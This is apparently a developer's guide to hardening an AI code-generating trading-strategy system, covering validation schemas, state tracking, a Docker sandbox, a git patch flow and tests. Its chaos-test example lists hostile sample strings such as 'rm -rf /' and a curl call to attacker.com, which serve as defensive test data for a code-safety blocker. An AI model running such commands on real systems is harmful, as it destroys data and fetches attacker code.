# Production Hardening Implementation Guide

## Overview

This guide provides step-by-step instructions to implement the production-ready components that were previously missing from the prototype system.

---

## Phase 0: Safety & Quick Wins (Week 1)

### 1. Pydantic Validators and JSONSchema Export ✅ IMPLEMENTED

**File**: `canonical_schema_v2.py`

**What was added**:
- All dataclasses converted to Pydantic BaseModel
- Runtime validation for all fields
- Custom validators for business logic
- JSON schema export functionality
- CLI for validation

**How to use**:
```bash
# Validate a strategy JSON file
python Backtest/canonical_schema_v2.py --validate codes/my_strategy.json

# Export all schemas
python Backtest/canonical_schema_v2.py --export-schemas schemas/

# Show specific schema
python Backtest/canonical_schema_v2.py --show-schema StrategyDefinition
```

**Integration steps**:
1. Update `gemini_strategy_generator.py` to import from `canonical_schema_v2`:
   ```python
   from canonical_schema_v2 import StrategyDefinition, GeneratedCode
   ```

2. Add validation in strategy_manager.py:
   ```python
   from canonical_schema_v2 import validate_strategy_json
   
   def load_strategy_json(json_path):
       try:
           strategy = validate_strategy_json(json_path)
           return strategy
       except ValidationError as e:
           logger.error(f"Invalid strategy JSON: {e}")
           raise
   ```

### 2. SQLite State Management ✅ IMPLEMENTED

**File**: `state_manager.py`

**What was added**:
- Persistent strategy lifecycle tracking
- Job queue for async operations
- Audit logging for all state changes
- Retry logic and error tracking
- CLI for monitoring

**How to use**:
```bash
# List all strategies
python Backtest/state_manager.py --db state.db list

# Check specific strategy status
python Backtest/state_manager.py --db state.db status RSI_Reversal

# View audit log
python Backtest/state_manager.py --db state.db audit --strategy RSI_Reversal

# List pending jobs
python Backtest/state_manager.py --db state.db jobs
```

**Integration into strategy_manager.py**:
```python
from state_manager import StateManager, StrategyStatus
from pathlib import Path

class StrategyManager:
    def __init__(self, codes_dir: Optional[Path] = None):
        self.codes_dir = codes_dir or Path(__file__).parent / "codes"
        self.state_manager = StateManager("state.db")
    
    def scan_strategies(self):
        """Scan and register all strategies"""
        for json_file in self.codes_dir.glob("*.json"):
            strategy_name = json_file.stem
            py_file = self.codes_dir / f"{strategy_name}.py"
            
            self.state_manager.register_strategy(
                name=strategy_name,
                json_path=str(json_file),
                py_path=str(py_file) if py_file.exists() else None
            )
    
    def generate_strategy(self, strategy_name: str):
        """Generate strategy with state tracking"""
        # Update status
        self.state_manager.update_status(
            strategy_name,
            StrategyStatus.GENERATING
        )
        
        try:
            # ... generation logic ...
            
            # On success
            self.state_manager.update_status(
                strategy_name,
                StrategyStatus.GENERATED
            )
        except Exception as e:
            self.state_manager.update_status(
                strategy_name,
                StrategyStatus.FAILED,
                error=str(e)
            )
            raise
```

### 3. Typed Tool Wrapper System ✅ IMPLEMENTED

**File**: `safe_tools.py`

**What was added**:
- Pydantic request/response schemas for all tools
- Path sanitization and validation
- Audit logging for every tool call
- Rate limiting
- Dry-run mode for testing

**How to use**:
```python
from safe_tools import SafeTools, ReadFileRequest, WriteFileRequest, ToolRegistry
from pathlib import Path

# Initialize tools
tools = SafeTools(
    workspace_root=Path("/path/to/workspace"),
    audit_logger=AuditLogger("tool_audit.jsonl")
)

# Read file safely
request = ReadFileRequest(
    path="codes/strategy.py",
    session_id="session_123"
)
response = tools.read_file(request)

if response.success:
    print(response.result["content"])
else:
    print(f"Error: {response.error}")

# Write file safely
request = WriteFileRequest(
    path="codes/new_strategy.py",
    content=generated_code,
    mode="create",
    session_id="session_123"
)
response = tools.write_file(request)
```

**Integration into AI agent**:
```python
class AIDeveloperAgent:
    def __init__(self):
        self.tools = SafeTools(
            workspace_root=Path(__file__).parent,
            audit_logger=AuditLogger("tool_audit.jsonl")
        )
        self.tool_registry = ToolRegistry(self.tools)
    
    def execute_tool(self, tool_name: str, **kwargs):
        """Execute tool by name"""
        request_class = {
            "read_file": ReadFileRequest,
            "write_file": WriteFileRequest,
            # ... etc
        }[tool_name]
        
        request = request_class(tool_name=tool_name, **kwargs)
        return self.tool_registry.execute(request)
```

---

## Phase 1: Playable Prototype (Week 2-3)

### 4. Docker-based Sandbox API ✅ IMPLEMENTED

**File**: `sandbox_orchestrator.py`

**What was added**:
- Docker container orchestration
- Resource limits (CPU, memory, timeout)
- Network isolation
- Copy-on-write filesystem
- Structured result capture
- Cleanup automation

**Prerequisites**:
```bash
# Ensure Docker is installed and running
docker --version

# Pull Python image
docker pull python:3.11-slim
```

**How to use**:
```python
from sandbox_orchestrator import SandboxRunner, SandboxConfig, CommandRequest
from pathlib import Path

# Create runner
runner = SandboxRunner(workspace_root=Path("AlgoAgent"))

# Run Python script in sandbox
result = runner.run_python_script(
    script_path="codes/RSI_Reversal.py",
    timeout=300
)

print(f"Exit code: {result.exit_code}")
print(f"Output: {result.stdout}")

# Or use low-level API
from sandbox_orchestrator import SandboxOrchestrator

orchestrator = SandboxOrchestrator(workspace_root=Path("AlgoAgent"))

# Create sandbox
config = SandboxConfig(
    cpu_limit="0.5",
    memory_limit="512m",
    network_mode="none",
    timeout=300
)
sandbox_id = orchestrator.create_sandbox(config)

# Run command
request = CommandRequest(
    command="python codes/test_strategy.py",
    timeout=300
)
result = orchestrator.run_command(sandbox_id, request)

# Cleanup
orchestrator.destroy_sandbox(sandbox_id)
```

**Integration into terminal_executor.py**:
```python
from sandbox_orchestrator import SandboxRunner

class TerminalExecutor:
    def __init__(self):
        self.sandbox_runner = SandboxRunner(
            workspace_root=Path(__file__).parent.parent
        )
        self.use_sandbox = True  # Toggle for dev/prod
    
    def run_script(self, script_path: Path, timeout: int = 300):
        if self.use_sandbox:
            result = self.sandbox_runner.run_python_script(
                script_path=str(script_path.relative_to(self.workspace_root)),
                timeout=timeout
            )
            return ExecutionResult(
                status=ExecutionStatus.SUCCESS if result.exit_code == 0 else ExecutionStatus.ERROR,
                exit_code=result.exit_code,
                stdout=result.stdout,
                stderr=result.stderr,
                execution_time=result.execution_time
            )
        else:
            # Fallback to direct execution (dev only)
            pass
```

### 5. Structured Output Enforcement ✅ IMPLEMENTED

**File**: `output_validator.py`

**What was added**:
- Pydantic schema enforcement for LLM responses
- AST parsing and syntax validation
- Code safety checker (blocks dangerous imports)
- Automatic code formatting (black, isort)
- Metadata extraction

**How to use**:
```python
from output_validator import OutputValidator, get_code_generation_prompt_schema

# Initialize validator
validator = OutputValidator(strict_safety=False)

# Validate LLM response
llm_response = """
{
  "code": "class MyStrategy(Strategy): ...",
  "entrypoint": "MyStrategy",
  "dependencies": ["backtesting", "pandas"]
}
"""

generated_code, errors = validator.validate_generated_code(llm_response)

if errors:
    print(f"Validation errors: {errors}")
else:
    print(f"✓ Valid code")
    print(f"Entrypoint: {generated_code.entrypoint}")
    print(f"LOC: {generated_code.metadata['lines_of_code']}")
```

**Integration into gemini_strategy_generator.py**:
```python
from output_validator import OutputValidator, get_code_generation_prompt_schema
import json

class GeminiStrategyGenerator:
    def __init__(self):
        self.validator = OutputValidator(strict_safety=False)
        self.model = genai.GenerativeModel('gemini-2.0-flash')
    
    def generate_strategy(self, strategy_def: StrategyDefinition):
        # Build prompt with schema requirement
        schema = get_code_generation_prompt_schema()
        
        prompt = f"""
        Generate a trading strategy based on this specification:
        {strategy_def.json()}
        
        IMPORTANT: Return your response as JSON matching this schema:
        {json.dumps(schema, indent=2)}
        """
        
        # Generate
        response = self.model.generate_content(prompt)
        
        # Validate response
        generated_code, errors = self.validator.validate_generated_code(
            response.text
        )
        
        if errors:
            # Try to fix common issues or regenerate
            logger.warning(f"Validation errors: {errors}")
            # ... retry logic ...
        
        return generated_code
```

### 6. Git Branch-based Patch Flow ✅ IMPLEMENTED

**File**: `git_patch_manager.py`

**What was added**:
- Branch creation for each generation/fix
- Automatic commit of changes
- Diff generation and review
- Safe merge workflow
- Rollback on failures
- Old branch cleanup

**How to use**:
```python
from git_patch_manager import PatchWorkflow
from pathlib import Path

# Initialize workflow
workflow = PatchWorkflow(repo_path=Path("AlgoAgent"))

# Start generation
branch = workflow.start_generation("RSI_Reversal")
print(f"Working on branch: {branch.name}")

# ... generate code ...

# Commit generated code
commit_hash = workflow.commit_generation(
    strategy_name="RSI_Reversal",
    file_path="codes/RSI_Reversal.py"
)

# ... test the code ...

# If tests pass, merge to main
if tests_passed:
    success = workflow.finalize_success(branch.name)
    if success:
        print("✓ Strategy merged to main")
else:
    # Rollback on failure
    workflow.rollback_failure(branch.name)
    print("✗ Changes discarded")
```

**Integration into ai_developer_agent.py**:
```python
from git_patch_manager import PatchWorkflow

class AIDeveloperAgent:
    def __init__(self):
        self.patch_workflow = PatchWorkflow(
            repo_path=Path(__file__).parent.parent
        )
        self.current_branch = None
    
    def generate_and_test_strategy(self, strategy_name: str):
        # Create work branch
        self.current_branch = self.patch_workflow.start_generation(strategy_name)
        
        try:
            # Generate code
            code = self.generate_strategy_code(strategy_name)
            
            # Save to file
            file_path = Path(f"codes/{strategy_name}.py")
            with open(file_path, 'w') as f:
                f.write(code)
            
            # Commit
            self.patch_workflow.commit_generation(strategy_name, str(file_path))
            
            # Test
            result = self.run_tests(file_path)
            
            if result.success:
                # Merge to main
                self.patch_workflow.finalize_success(self.current_branch.name)
                return "Success"
            else:
                # Try to fix
                for attempt in range(3):
                    fixed_code = self.fix_code(code, result.errors)
                    with open(file_path, 'w') as f:
                        f.write(fixed_code)
                    
                    # Commit fix
                    self.patch_workflow.commit_fix(
                        strategy_name,
                        str(file_path),
                        result.errors[0] if result.errors else "Unknown error"
                    )
                    
                    result = self.run_tests(file_path)
                    if result.success:
                        self.patch_workflow.finalize_success(self.current_branch.name)
                        return "Success after fixes"
                
                # Failed after all attempts
                self.patch_workflow.rollback_failure(self.current_branch.name)
                return "Failed"
        
        except Exception as e:
            # Rollback on any error
            if self.current_branch:
                self.patch_workflow.rollback_failure(self.current_branch.name)
            raise
```

---

## Phase 2: Resilience & Scale (Week 4-6)

### 7. Secrets Vault Integration (TO IMPLEMENT)

**Priority**: HIGH for production
**Complexity**: MEDIUM

**Implementation plan**:

1. Install secrets manager:
```bash
# Option A: HashiCorp Vault (recommended)
docker pull vault
docker run --cap-add=IPC_LOCK -d --name=dev-vault -p 8200:8200 vault

# Option B: AWS Secrets Manager
pip install boto3

# Option C: Simple encrypted file (dev only)
pip install cryptography
```

2. Create `secrets_manager.py`:
```python
from typing import Dict, Optional
import os
from cryptography.fernet import Fernet

class SecretsManager:
    def __init__(self, vault_url: Optional[str] = None):
        self.vault_url = vault_url or os.getenv('VAULT_URL')
        # Initialize vault client
    
    def get_secret(self, key: str) -> str:
        """Retrieve secret by key"""
        pass
    
    def set_secret(self, key: str, value: str):
        """Store secret"""
        pass
    
    def issue_ephemeral_token(self, ttl_seconds: int = 3600) -> str:
        """Issue short-lived token"""
        pass
    
    def revoke_token(self, token: str):
        """Revoke token"""
        pass
```

3. Integration example:
```python
from secrets_manager import SecretsManager

# In sandbox creation
secrets = SecretsManager()

# Issue ephemeral API key for sandbox
ephemeral_key = secrets.issue_ephemeral_token(ttl_seconds=300)

# Pass to sandbox as env var (not mounted file)
config = SandboxConfig(
    env_vars={
        "GEMINI_API_KEY": ephemeral_key
    }
)

# After sandbox destroyed, revoke token
secrets.revoke_token(ephemeral_key)
```

### 8. Vector DB for RAG (TO IMPLEMENT)

**Priority**: MEDIUM
**Complexity**: HIGH

**Implementation plan**:

1. Install Qdrant:
```bash
docker pull qdrant/qdrant
docker run -p 6333:6333 qdrant/qdrant
pip install qdrant-client sentence-transformers
```

2. Create `rag_memory.py`:
```python
from qdrant_client import QdrantClient
from sentence_transformers import SentenceTransformer

class RAGMemory:
    def __init__(self):
        self.client = QdrantClient("localhost", port=6333)
        self.encoder = SentenceTransformer('all-MiniLM-L6-v2')
        self.collection_name = "strategy_memory"
    
    def add_memory(self, text: str, metadata: Dict[str, Any]):
        """Add memory with embedding"""
        embedding = self.encoder.encode(text)
        self.client.upsert(
            collection_name=self.collection_name,
            points=[{
                "id": uuid.uuid4().hex,
                "vector": embedding.tolist(),
                "payload": {"text": text, **metadata}
            }]
        )
    
    def search(self, query: str, limit: int = 5):
        """Search memories"""
        query_embedding = self.encoder.encode(query)
        results = self.client.search(
            collection_name=self.collection_name,
            query_vector=query_embedding.tolist(),
            limit=limit
        )
        return results
```

3. Integration:
```python
# On test failure
rag_memory.add_memory(
    text=f"Strategy {name} failed with {error_msg}. Fixed by {fix_description}",
    metadata={"strategy": name, "error_type": "ImportError", "timestamp": datetime.now()}
)

# On generation
similar_failures = rag_memory.search(f"Strategy failed with {current_error}", limit=3)
# Use similar failures in prompt to LLM
```

---

## Phase 3: Production Readiness (Week 7-8)

### 9. Comprehensive Testing Suite (TO IMPLEMENT)

**Priority**: HIGH
**Complexity**: MEDIUM

**Files to create**:

1. `tests/test_integration.py`:
```python
import pytest
from pathlib import Path
from strategy_manager import StrategyManager
from state_manager import StateManager, StrategyStatus

def test_end_to_end_generation():
    """Test complete strategy generation pipeline"""
    manager = StrategyManager()
    state = StateManager(":memory:")  # In-memory DB for testing
    
    # Create test JSON
    strategy_json = {
        "name": "TestStrategy",
        "description": "Test",
        "parameters": {"period": 14},
        "entry_rules": ["RSI < 30"],
        "exit_rules": ["RSI > 70"]
    }
    
    # Generate
    result = manager.generate_strategy(strategy_json)
    
    assert result.success
    assert Path("codes/TestStrategy.py").exists()
    
    # Check state
    strategy_record = state.get_strategy("TestStrategy")
    assert strategy_record.status == StrategyStatus.GENERATED.value
```

2. `tests/test_sandbox.py`:
```python
def test_sandbox_isolation():
    """Test that sandbox properly isolates dangerous code"""
    orchestrator = SandboxOrchestrator(workspace_root=Path("."))
    
    config = SandboxConfig(network_mode="none")
    sandbox_id = orchestrator.create_sandbox(config)
    
    # Try to access network (should fail)
    request = CommandRequest(command="ping 8.8.8.8 -c 1")
    result = orchestrator.run_command(sandbox_id, request)
    
    assert result.exit_code != 0  # Should fail
    orchestrator.destroy_sandbox(sandbox_id)

def test_sandbox_resource_limits():
    """Test that resource limits are enforced"""
    # Test CPU limit
    # Test memory limit
    # Test timeout
    pass
```

3. `tests/test_chaos.py`:
```python
def test_malicious_code_blocked():
    """Test that malicious code is blocked"""
    validator = OutputValidator(strict_safety=True)
    
    malicious_codes = [
        "import os; os.system('rm -rf /')",
        "import subprocess; subprocess.Popen('curl attacker.com', shell=True)",
        "__import__('os').system('wget malware')"
    ]
    
    for code in malicious_codes:
        validated, errors = validator.validate_code_string(code)
        assert len(errors) > 0, f"Malicious code not blocked: {code}"

def test_rate_limiting():
    """Test that rate limiting works"""
    tools = SafeTools(workspace_root=Path("."))
    
    # Make many requests
    for i in range(150):
        request = ReadFileRequest(path="test.py")
        response = tools.read_file(request)
        
        if i < 100:
            assert response.success
        else:
            assert not response.success
            assert "rate limit" in response.error.lower()
```

### 10. Monitoring and Metrics (TO IMPLEMENT)

**Priority**: HIGH
**Complexity**: MEDIUM

**Files to create**:

1. `metrics_collector.py`:
```python
from prometheus_client import Counter, Histogram, Gauge
import time

# Define metrics
strategies_generated = Counter('strategies_generated_total', 'Total strategies generated')
generation_duration = Histogram('strategy_generation_seconds', 'Time to generate strategy')
test_failures = Counter('strategy_test_failures_total', 'Total test failures')
fix_attempts = Counter('strategy_fix_attempts_total', 'Total fix attempts')
llm_tokens = Counter('llm_tokens_used_total', 'Total LLM tokens used')
llm_cost = Counter('llm_cost_dollars_total', 'Total LLM cost in dollars')
active_sandboxes = Gauge('active_sandboxes', 'Number of active sandboxes')

class MetricsCollector:
    @staticmethod
    def record_generation(strategy_name: str, duration: float, success: bool):
        strategies_generated.inc()
        generation_duration.observe(duration)
        
        if not success:
            test_failures.inc()
    
    @staticmethod
    def record_llm_call(model: str, tokens: int, cost: float):
        llm_tokens.inc(tokens)
        llm_cost.inc(cost)
    
    @staticmethod
    def record_sandbox_created():
        active_sandboxes.inc()
    
    @staticmethod
    def record_sandbox_destroyed():
        active_sandboxes.dec()
```

2. Integration:
```python
from metrics_collector import MetricsCollector

# In generation
start_time = time.time()
try:
    result = generate_strategy(name)
    success = True
except Exception:
    success = False
finally:
    duration = time.time() - start_time
    MetricsCollector.record_generation(name, duration, success)

# Expose metrics endpoint
from prometheus_client import start_http_server
start_http_server(8000)  # Metrics at http://localhost:8000/metrics
```

---

## Deployment Checklist

### Development Environment
- [ ] All Python dependencies installed (`requirements.txt`)
- [ ] Docker installed and running
- [ ] Git configured
- [ ] Gemini API key in `.env`
- [ ] Database initialized (`python state_manager.py list`)

### Testing
- [ ] Unit tests passing (`pytest tests/`)
- [ ] Integration tests passing
- [ ] Chaos tests passing
- [ ] Manual end-to-end test successful

### Production Environment
- [ ] Replace Docker with microVMs (Firecracker/gVisor)
- [ ] Secrets vault configured
- [ ] Vector DB deployed
- [ ] Monitoring stack deployed (Prometheus + Grafana)
- [ ] Audit logs configured for immutable storage
- [ ] Rate limits configured
- [ ] Backup strategy implemented

### Security
- [ ] All secrets in vault (not .env)
- [ ] Sandbox network isolation verified
- [ ] Dangerous imports blocked
- [ ] Audit logs immutable
- [ ] RBAC configured for sensitive operations
- [ ] Ephemeral credentials implemented

### Performance
- [ ] Metrics collection enabled
- [ ] Cost tracking active
- [ ] Resource limits tuned
- [ ] Parallel execution tested
- [ ] Database indexes created

---

## Quick Start Commands

```bash
# 1. Install dependencies
pip install pydantic sqlmodel black isort pytest prometheus-client

# 2. Initialize state database
python Backtest/state_manager.py --db state.db list

# 3. Validate all strategy JSONs
for f in codes/*.json; do
    python Backtest/canonical_schema_v2.py --validate "$f"
done

# 4. Test sandbox
python Backtest/sandbox_orchestrator.py --workspace . --run codes/example_strategy.py

# 5. Run full test suite
pytest tests/ -v

# 6. Start metrics endpoint
python -c "from prometheus_client import start_http_server; start_http_server(8000); input('Press Enter to stop...')"

# 7. Generate strategy with new pipeline
python strategy_manager.py --generate --strategy RSI_Reversal

# 8. Monitor job queue
watch -n 5 "python Backtest/state_manager.py --db state.db jobs"

# 9. Cleanup old branches
python Backtest/git_patch_manager.py --repo . cleanup --days 7
```

---

## Troubleshooting

### Issue: Docker not available
**Solution**: Sandbox will fall back to direct execution (unsafe). Install Docker or use remote sandbox service.

### Issue: Rate limit exceeded
**Solution**: Adjust rate limiter settings in `safe_tools.py` or wait for window to reset.

### Issue: State database locked
**Solution**: Ensure only one process is using the database. Add connection pooling if needed.

### Issue: LLM returning invalid JSON
**Solution**: Check `output_validator.py` - it will try to extract JSON from markdown blocks. Add retry logic.

### Issue: Git merge conflicts
**Solution**: Patch workflow uses squash merges to avoid conflicts. Check branch hasn't diverged significantly.

---

## Next Steps After Implementation

1. **Optimize Performance**:
   - Profile sandbox startup time
   - Implement connection pooling for database
   - Add caching for common operations
   - Parallel strategy generation

2. **Enhanced Features**:
   - Web UI for monitoring
   - Slack/email notifications
   - Multi-model support (Claude, GPT-4)
   - Strategy version compare

3. **Scale Up**:
   - Kubernetes deployment
   - Load balancer for multiple workers
   - Distributed job queue (Redis/RabbitMQ)
   - Multi-region deployment

---

## Support & Contact

For issues or questions about the implementation:
1. Check audit logs: `python state_manager.py audit`
2. Review metrics: `curl http://localhost:8000/metrics`
3. Check tool audit: `tail -f tool_audit.jsonl`
